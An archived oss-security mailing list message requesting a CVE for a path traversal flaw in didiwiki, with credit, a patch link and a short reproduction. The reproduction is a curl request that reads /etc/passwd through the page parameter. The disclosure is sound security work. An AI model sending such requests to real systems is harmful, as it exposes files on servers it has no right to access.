X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/19/4
Message-ID: <CADk+ZPMDvowM_5AtCL0j3wQ+Ote6HCJVbWoLJRsG_SKbpSHHmg@mail.gmail.com>
Date: Thu, 18 Feb 2016 18:02:21 -0500
From: Ignace Mouzannar <mouzannar@...il.com>
To: oss-security@...ts.openwall.com
Cc: security@...ian.org, Alexander Izmailov <yarolig@...il.com>
Subject: CVE request: didiwiki path traversal vulnerability
Content-Type: text/plain; charset=utf-8

Hello,

Please can I have a CVE assigned to the following vulnerability?

- Versions Affected: all versions of didiwiki
- Bug discovered by: Alexander Izmailov
- Patch Available: https://github.com/OpenedHand/didiwiki/pull/1/files
- Patch provided by: Alexander Izmailov
- Description:

Allows a user to access any file on the filesystem from the browser.
To reproduce it, on Debian:
----
apt-get install didiwiki

curl http://localhost:8000/api/page/get?page=/etc/passwd
----

Thank you for your help.

 Ignace M
